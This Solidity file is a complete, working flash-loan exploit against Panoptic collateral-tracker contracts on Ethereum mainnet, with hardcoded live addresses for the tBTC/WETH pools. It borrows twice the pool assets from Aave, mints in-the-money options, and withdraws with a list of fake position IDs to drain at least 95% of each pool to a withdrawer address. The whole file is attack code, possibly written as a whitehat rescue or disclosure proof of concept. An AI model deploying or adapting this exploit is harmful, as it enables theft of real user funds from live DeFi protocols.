// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract TBTC_WETH30bpsMainnetAttacker_Deployer {
    TBTC_WETH30bpsMainnetAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x18084fbA666a33d37592fA2633fD49a74DD93a88)); // tbtc
    IERC20Partial token1 = IERC20Partial(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)); // weth
    ICollateralTracker tracker0 = ICollateralTracker(address(0xD832250205607FAFcf01c94971af0295f08aC631));
    ICollateralTracker tracker1 = ICollateralTracker(address(0xe0b058AEbFed7e03494dA2644380F8C0BC706F1e));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new TBTC_WETH30bpsMainnetAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract TBTC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
    uint256[] fake_token_uints = [16932343400165264, 16988277108887827, 17035745045722363, 16939609024273842, 17133860513315788, 16898430492320797, 17101708812844843, 16927858255610090, 17086352299123725, 17003795739444277, 17029994500126407, 17006045362593199, 17082751614160489, 17063366226512834, 17097157113273900, 16905884702516433, 16920834318597884, 16985606900097701, 16942964596981210, 16889820611195521, 16949521359855531, 17085189125086153, 16988002051593903, 16914178675719633, 16890694515986045, 17074540876198711, 17119951603807036, 17087492124011028, 17119329401324348, 17036991767596593, 16999873957325411, 17031339119151811, 17089567784803601, 16900417526689188, 17130624793684447, 16910690735799991, 17073996118339521, 17073485236538696, 16890488824791009, 16989089162921432, 17003020264083211, 17093568332869701, 17066233128463852, 16941005867879549, 16989238486935005, 17126049222761791, 17142166672779123, 16897464278369093, 17144420237880467, 17101150678162124, 16927713925256617, 16894635486029112, 17092584053216203, 16992821954860765, 17027825720482802, 16992964215424125, 16942409542027123, 17062001812029684, 17140497124282292, 16905463410247128, 16983642686367768, 17005578710070990, 17052541747857150, 17001603935953842, 17029512578671493, 17130759040409663, 17114800599387293, 16908625724213635, 17166195869489409, 17101208203141327, 16894658434788774, 17139615699826370, 16895911887472093, 16938993875545352, 17072849265831395, 17022720534783960, 17075863080850773, 17017661774688634, 16908153974732775, 16971120488436790, 16988465729292003, 17014445553286162, 16899543848560918, 16894355756410939, 17119602343874712, 16967923632426531, 17129841125473381, 17099849001593597, 17020691157262149, 16897926812058864, 17122672512185594, 17154365982004348, 17044600072961146, 17054951623905443, 16988827310790466, 17064714233413875, 16946829128487768, 17146520609095429, 16972156248137231, 16962955384487272, 16929389484689115, 16934457177659003, 16998536847852287, 17088317117953075, 17140315683590255, 17021660217262511, 16905067998086360, 17022423542452956, 17094514593261230, 16888769806416760, 17029198303267245, 16972063987353239, 16947327288449607, 17029065097821193, 16996711919775464, 16942458681986566, 17057227897167136, 17029873506273690, 16990649632113938, 16968539133849167, 16913491436315882, 16944179477276374, 16993502753544935, 17161081997515482, 16968143087326031, 17022685737634914, 16991628369728980, 17057008683916553, 16921290824134246, 16932248563778116, 16991286763756420, 17094346387673542, 17030010218713865, 16970073014124536, 16943603167087332, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On mainnet
    IERC20Partial token0 = IERC20Partial(address(0x18084fbA666a33d37592fA2633fD49a74DD93a88)); // tbtc
    IERC20Partial token1 = IERC20Partial(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)); // weth
    IAAVELendingPool aavePool = IAAVELendingPool(address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2));

    ICollateralTracker tracker0 = ICollateralTracker(address(0xD832250205607FAFcf01c94971af0295f08aC631));
    ICollateralTracker tracker1 = ICollateralTracker(address(0xe0b058AEbFed7e03494dA2644380F8C0BC706F1e));
    IPanopticPool pp = IPanopticPool(address(0x0d694230686C1973E8ED8b607f48D3B0Dc5A2bF1));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
      withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            address[] memory addresses = new address[](2);
            uint256[] memory amounts = new uint256[](2);
            uint256[] memory modes = new uint256[](2);

            addresses[0] = address(token0);
            amounts[0] = (2 * poolAssets0); // borrow 200% of the pool assets
            modes[0] = 0;

            addresses[1] = address(token1);
            amounts[1] = (2 * poolAssets1); // borrow 200% of the pool assets
            modes[1] = 0;

            aavePool.flashLoan(address(this), addresses, amounts, modes, address(this), bytes(""), 0);
        }
    }

    // This function is called by the flash loan provider
    // We use it to execute our attack logic after taking a flash loan
    function executeOperation(
        address[] calldata, // assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator,
        bytes calldata // params
    ) public returns (bool) {
        // executeOperation has to be public for the Aave flash loan to callback into us
        // However, we should only let this get called once ever:
        require(!executed);
        // Phase 1: Drain the pool
        drainPool();

        // Phase 2: buy options and then drain pool (not implemented in this example)

        // pay back the flash loan
        token0.approve(address(aavePool), amounts[0] + premiums[0]);
        token1.approve(address(aavePool), amounts[1] + premiums[1]);
        executed = true;

        return true;
    }


    function drainPool() internal {
        // drain the pool

        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(2535301200493369346302447702730);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(2535301200493369346302447702730);
        posIdList2[1] = TokenId.wrap(2560008631394923039873505153738);

        /* No longer necessary, we precomputed the TokenIds, they are above
        {
          // --- for Asset 0
          TokenId pos0 = TokenId.wrap(0).addPoolId(ISFPM(address(0x0000000000000DEdEDdD16227aA3D836C5753194)).getPoolId(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD)).addLeg(
              0, // legIndex
              1, // optionRatio
              0, // asset
              0, // isLong
              0, // tokenType
              0, // riskPartner
              -327_000, // strikeTick strike - should be WAAAAY low -- (rounded) minEnforcedTick + spacing, so that tickLower is within bounds
              2 // width; defined as (tickUpper - tickLower) / tickSpacing
          );
          posIdList[0] = pos0;

          // --- for Asset 1
          TokenId pos1 = TokenId.wrap(0).addPoolId(ISFPM(address(0x0000000000000DEdEDdD16227aA3D836C5753194)).getPoolId(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD)).addLeg(
              0, // legIndex
              1, // optionRatio
              1, // asset
              0, // isLong
              1, // tokenType
              0, // riskPartner
              470400, // waaaay high -- (rounded) maxEnforcedTick - spacing, so that tickUpper is within bounds
              2 // width; defined as (tickUpper - tickLower) / tickSpacing
          );

          posIdList2[0] = pos0;
          posIdList2[1] = pos1;
        }
        */

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }
}
